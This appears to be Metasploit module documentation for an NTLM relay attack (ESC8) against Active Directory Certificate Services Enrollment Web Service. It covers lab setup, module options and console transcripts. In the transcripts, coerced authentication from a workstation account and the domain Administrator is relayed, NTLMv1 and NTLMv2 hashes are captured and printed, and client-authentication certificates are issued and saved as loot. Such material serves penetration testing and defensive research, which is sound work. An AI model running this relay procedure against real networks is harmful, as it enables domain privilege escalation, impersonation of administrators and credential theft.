## Vulnerable Application

This module targets Active Directory Certificate Services Certificate Enrollment Web Service (CES) instances that accept NTLM authentication without enforcing Extended Protection for Authentication (EPA). CES implements WS-Trust X.509v3 Token Enrollment Extensions (WSTEP), so the endpoint and request format differ from the Certification Authority Web Enrollment `/certsrv/` interface.

CES is installed on a domain member with the Certificate Enrollment Web Service role. A lab can be configured by installing `ADCS-Enroll-Web-Svc`, obtaining a server-authentication certificate for IIS, and then running `Install-AdcsEnrollmentWebService` for an Enterprise CA with `-AuthenticationType Kerberos`. The resulting URI is normally published in the CA object's `msPKI-Enrollment-Servers` attribute and resembles:

```
https://ca.example.local/EXAMPLE-CA_CES_Kerberos/service.svc/CES
```

For a vulnerable test configuration, Windows authentication must accept NTLM and neither IIS Windows Authentication nor the CES `web.config` transport binding may require EPA. A useful coercion target must also be available, such as a host vulnerable to PetitPotam. Do not install renewal-only CES for this scenario because it rejects initial certificate enrollment.

## Verification Steps

1. Configure a CES instance without EPA and identify its exact published enrollment URI.
1. Start `msfconsole` with sufficient local privileges to bind the selected SMB or HTTP listener port.
1. Run `use auxiliary/server/relay/esc8_ces`.
1. Set `RHOSTS`, `TARGETURI`, `VHOST`, and `CES_TO` for the published CES URI.
1. Select `RELAY_SOURCE SMB` for SMB coercion, or `RELAY_SOURCE HTTP` and an HTTP `SRVPORT` for an HTTP authentication source.
1. Run the module and coerce an eligible domain principal to authenticate to the relay server.
1. Verify that a PKCS#12 certificate is stored as loot.

## Options

### RELAY_SOURCE

Selects the inbound protocol used to collect the NTLM authentication. `SMB` is the default. For `HTTP`, set `SRVPORT` to the advertised HTTP listener port.

### SSL

Controls TLS for the outbound connection to CES. HTTPS is the normal CES deployment and is enabled by default; disable it only when the target endpoint is published over HTTP.

### SRVSSL

Controls TLS for incoming HTTP relay connections and is independent of `SSL`. It defaults to disabled because clients do not need to authenticate the relay server over HTTPS. Enable it when the coercion path requires HTTPS, and configure `SSLCert` if the victim must trust or validate the relay certificate.

### TARGETURI

The complete path to the CES endpoint, ending in `service.svc/CES`. CES paths contain deployment-specific CA and authentication information and cannot be reliably discovered from only an IP address.

### VHOST

The virtual hostname to send to IIS. Set this when relaying to an IP address while the published CES URI uses a DNS hostname.

### CES_TO

Overrides the absolute WS-Addressing destination in the SOAP request. Set this to the published CES URI when it differs from the relay target address.

### MODE

`AUTO` requests `DomainController` followed by `Machine` for a relayed machine account and `User` for a relayed user. `SPECIFIC_TEMPLATE` requests only `CERT_TEMPLATE`. CES does not provide the template-list HTML operation used by Certification Authority Web Enrollment.

### CERT_TEMPLATE

The certificate template requested when `MODE` is `SPECIFIC_TEMPLATE`.

### CES_AUTH_SCHEME

The HTTP authorization scheme used with outbound NTLMSSP messages. Integrated CES instances normally advertise `Negotiate`; select `NTLM` only for an endpoint configured to advertise and accept it.

## Scenarios

### Windows Server 2019 CES, NTLMv1 HTTP to HTTPS relay

`curl.exe --ntlm --user 'WHISTLER\Administrator:<password>' http://192.168.3.8:8082/` is a simple test command that will trigger an HTTP authentication attempt to the relay server.

```
msf auxiliary(server/relay/esc8_ces) > set RELAY_SOURCE HTTP
msf auxiliary(server/relay/esc8_ces) > set SRVPORT 8082
msf auxiliary(server/relay/esc8_ces) > set RHOSTS 10.5.134.192
msf auxiliary(server/relay/esc8_ces) > set TARGETURI /whistler-JACKDC-CA_CES_Kerberos/service.svc/CES
msf auxiliary(server/relay/esc8_ces) > set VHOST jackdc.whistler.local
msf auxiliary(server/relay/esc8_ces) > set MODE AUTO
msf auxiliary(server/relay/esc8_ces) > run
[*] Checking endpoint on https://10.5.134.192:443/whistler-JACKDC-CA_CES_Kerberos/service.svc/CES
[*] Relay server started
[*] Received Type 1 message from 10.5.134.194, attempting to relay...
[*] Received Type 3 message from 10.5.134.194, attempting to relay...
[+] Identity: WHISTLER\JACKWS$ - Successfully relayed NTLM authentication to HTTPS!
[+] Certificate generated using template Machine for WHISTLER\JACKWS$
[*] Certificate stored at: /home/user/.msf4/loot/certificate.pfx
msf auxiliary(server/relay/esc8_ces) > options

Module options (auxiliary/server/relay/esc8_ces):

   Name                 Current Setting                                   Required  Description
   ----                 ---------------                                   --------  -----------
   ADD_CERT_APP_POLICY                                                    no        Add certificate application policy OIDs
   ALT_DNS                                                                no        Alternative certificate DNS
   ALT_SID                                                                no        Alternative object SID
   ALT_UPN                                                                no        Alternative certificate UPN (format: USER@DOMAIN)
   JOHNPWFILE                                                             no        Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 hashes, each of
                                                                                    which is stored in separate files. Can also be a path.
   MODE                 AUTO                                              yes       The certificate issue mode (Accepted: AUTO, SPECIFIC_TEMPLATE)
   ON_BEHALF_OF                                                           no        Username to request on behalf of (format: DOMAIN\USER)
   PFX                                                                    no        Certificate to request on behalf of
   Proxies                                                                no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, so
                                                                                    cks4, socks5, socks5h, http
   RELAY_SOURCE         HTTP                                              yes       Protocol from which to relay NTLM authentication (Accepted: SMB, HTTP)
   RELAY_TIMEOUT        25                                                yes       Seconds that the relay socket will wait for a response after the client has initiated comm
                                                                                    unication.
   RHOSTS               10.5.134.192                                      yes       Target address range or CIDR identifier to relay to
   RPORT                443                                               yes       The target port (TCP)
   SMBDomain            WHISTLER                                          yes       The domain name used during SMB exchange.
   SRVHOST              192.168.3.8                                       yes       The local host to listen on.
   SRVPORT              8082                                              yes       The local port to listen on.
   SRV_TIMEOUT          25                                                yes       Seconds that the server socket will wait for a response after the client has initiated com
                                                                                    munication.
   SSL                  true                                              no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                                                no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI            /whistler-JACKDC-CA_CES_Kerberos/service.svc/CES  yes       Full path to the CES service.svc/CES endpoint
   VHOST                jackdc.whistler.local                             no        HTTP server virtual host


   When MODE is SPECIFIC_TEMPLATE:

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CERT_TEMPLATE  User             no        The template to issue in SPECIFIC_TEMPLATE mode


   When RELAY_SOURCE is HTTP:

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   SRVSSL  false            no        Negotiate SSL/TLS for incoming HTTP relay connections


Auxiliary action:

   Name   Description
   ----   -----------
   Relay  Run an NTLM ESC8 relay server



View the full module info with the info, or info -d command.

msf auxiliary(server/relay/esc8_ces) > run
[*] Auxiliary module running as background job 0.
msf auxiliary(server/relay/esc8_ces) >
[*] Checking endpoint on https://10.5.134.192:443/whistler-JACKDC-CA_CES_Kerberos/service.svc/CES
[*] Using URL: http://192.168.3.8:8082/
[*] Relay server started
[*] Received GET request for / from 10.5.134.194:53779
[*] Processing request in state unauthenticated from 10.5.134.194
[*] Received Type 1 message from 10.5.134.194, attempting to relay...
[*] Attempting to relay to 10.5.134.192:443
[*] Received type2 from target https://10.5.134.192:443, attempting to relay back to client
[*] Received GET request for / from 10.5.134.194:53779
[*] Processing request in state awaiting_type3 from 10.5.134.194
[*] Received Type 3 message from 10.5.134.194, attempting to relay...
[HTTP] NTLMv1-SSP Client     : 10.5.134.192
[HTTP] NTLMv1-SSP Username   : WHISTLER\Administrator
[HTTP] NTLMv1-SSP Hash       : Administrator::WHISTLER:ed7023668b4b6a1300000000000000000000000000000000:5dc0e988d0aaccbc385e047e3bbb4f2a7d0f9c1eed104f7c:9164ee517a76bfc7

[+] Identity: WHISTLER\Administrator - Successfully relayed NTLM authentication to HTTPS!
[*] Building a certificate signing request for user Administrator - RSA key size: 2048 - digest algorithm: SHA256 - template: User
[*] Submitting the certificate signing request to the target...
[+] Certificate generated using template User for WHISTLER\Administrator
[*] Certificate Policies:
[*]   * msEFS
[*]   * emailProtection
[*]   * clientAuth
[*] Certificate UPN: Administrator@whistler.local
[*] Certificate stored at: /Users/jheysel/.msf4/loot/20261006124429_default_10.5.134.192_windows.ad.cs_274311.pfx
[*] Relay tasks complete; waiting for the next login attempt
[*] Target list exhausted for 10.5.134.194. Closing connection.

msf auxiliary(server/relay/esc8_ces) > jobs -K

```


### Windows Server 2019 CES, NTLMv2 SMB to HTTPS relay
For SMB coercion, change `RELAY_SOURCE` to `SMB`, use `SRVPORT 445`, and direct PetitPotam or another SMB authentication coercion method to `SRVHOST`.
`net use \\192.168.3.8\test /u:WHISTLER\Administrator <password>` is a simple test command that will trigger an SMB authentication attempt to the relay server.
```
msf auxiliary(server/relay/esc8_ces) > set RELAY_SOURCE SMB
RELAY_SOURCE => SMB
msf auxiliary(server/relay/esc8_ces) > set srvport 445
srvport => 445
msf auxiliary(server/relay/esc8_ces) > run
[*] Auxiliary module running as background job 0.
msf auxiliary(server/relay/esc8_ces) >
[*] Checking endpoint on https://10.5.134.192:443/whistler-JACKDC-CA_CES_Kerberos/service.svc/CES
[*] SMB Server is running. Listening on 192.168.3.8:445
[*] Relay server started
[*] New request from 10.5.134.194
I, [2026-10-06T13:59:13.967948 #19636]  INFO -- : Starting thread for connection from 10.5.134.194
I, [2026-10-06T13:59:14.398561 #19636]  INFO -- : Negotiated dialect: SMB v2.0.2
D, [2026-10-06T13:59:14.495103 #19636] DEBUG -- : Dispatching request to do_session_setup_smb2 (session: nil)
D, [2026-10-06T13:59:14.655191 #19636] DEBUG -- : Dispatching request to do_session_setup_smb2 (session: #<Session id: 3061297321, user_id: nil, state: :in_progress>)
I, [2026-10-06T13:59:14.686006 #19636]  INFO -- : NTLM authentication request overridden to succeed for WHISTLER\Administrator
D, [2026-10-06T13:59:14.817268 #19636] DEBUG -- : Dispatching request to do_tree_connect_smb2 (session: #<Session id: 3061297321, user_id: "WHISTLER\\Administrator", state: :valid>)
[*] Received request for WHISTLER\Administrator
[*] Relaying to next target https://10.5.134.192:443/whistler-JACKDC-CA_CES_Kerberos/service.svc/CES
D, [2026-10-06T13:59:15.314268 #19636] DEBUG -- : Dispatching request to do_session_setup_smb2 (session: #<Session id: 3061297321, user_id: "WHISTLER\\Administrator", state: :in_progress>)
I, [2026-10-06T13:59:15.345204 #19636]  INFO -- : Relaying NTLM type 1 message to https://10.5.134.192:443/whistler-JACKDC-CA_CES_Kerberos/service.svc/CES (Always Sign: true, Sign: true, Seal: false)
D, [2026-10-06T13:59:16.559406 #19636] DEBUG -- : Dispatching request to do_session_setup_smb2 (session: #<Session id: 3061297321, user_id: "WHISTLER\\Administrator", state: :in_progress>)
I, [2026-10-06T13:59:16.678830 #19636]  INFO -- : Relaying NTLMv2 type 3 message to https://10.5.134.192:443/whistler-JACKDC-CA_CES_Kerberos/service.svc/CES as WHISTLER\Administrator
[SMB] NTLMv2-SSP Client     : 10.5.134.192
[SMB] NTLMv2-SSP Username   : WHISTLER\Administrator
[SMB] NTLMv2-SSP Hash       : Administrator::WHISTLER:7a375d2d02cf052b:1056b10fa0a8b7c83600544c01762257:0101000000000000bef6248cd555dd0173642ee4b548ae1b0000000002001000570048004900530054004c004500520001000c004a00410043004b004400430004001c00770068006900730074006c00650072002e006c006f00630061006c0003002a004a00610063006b00440043002e00770068006900730074006c00650072002e006c006f00630061006c0005001c00770068006900730074006c00650072002e006c006f00630061006c0007000800bef6248cd555dd01060004000200000008003000300000000000000000000000003000004b2e30494dac04381d91ed9ea8ce923dba2cf0d8e360441734810aa4906b9d9d0a001000000000000000000000000000000000000900200063006900660073002f003100390032002e003100360038002e0033002e0038000000000000000000

[+] Identity: WHISTLER\Administrator - Successfully authenticated against relay target https://10.5.134.192:443/whistler-JACKDC-CA_CES_Kerberos/service.svc/CES
[*] Building a certificate signing request for user Administrator - RSA key size: 2048 - digest algorithm: SHA256 - template: User
[*] Submitting the certificate signing request to the target...
[+] Certificate generated using template User for WHISTLER\Administrator
[*] Certificate Policies:
[*]   * msEFS
[*]   * emailProtection
[*]   * clientAuth
[*] Certificate UPN: Administrator@whistler.local
[*] Certificate stored at: /Users/jheysel/.msf4/loot/20261006135918_default_10.5.134.192_windows.ad.cs_743692.pfx
[*] Relay tasks complete; waiting for the next login attempt
```
